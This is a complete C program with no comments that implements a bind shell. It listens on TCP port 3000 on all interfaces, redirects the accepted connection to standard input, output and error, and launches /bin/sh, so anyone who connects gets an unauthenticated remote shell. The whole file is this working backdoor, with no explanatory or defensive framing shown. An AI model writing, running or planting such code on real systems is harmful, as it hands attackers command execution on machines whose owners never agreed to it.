#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main()
{
    int ls;
    ls = socket(AF_INET, SOCK_STREAM, 0);
    if (ls < 0) {
        printf("socket() failed.\n");
        return 1;
    }
    struct sockaddr_in s_addr;
    s_addr.sin_family = AF_INET;
    s_addr.sin_port = htons(3000);
    s_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(ls, (struct sockaddr *) &s_addr, sizeof(s_addr)) < 0) {
        printf("bind() failed.\n");
        close(ls);
        return 1;
    }

    if (listen(ls, 0) < 0) {
        printf("listen() failed\n");
        close(ls);
        return 1;
    }

    int fd = accept(ls, NULL, NULL);

    if (fd < 0) {
        printf("accept() failed\n");
        return 1;
    }

    for (int i = 0; i <= 2; i++) {
        if (dup2(fd, i) < 0) {
            printf("dup2() failed for fd: %d\n", i);
            return 1;
        }
    }

    execve("/bin/sh", NULL, NULL);

    return 0;
}
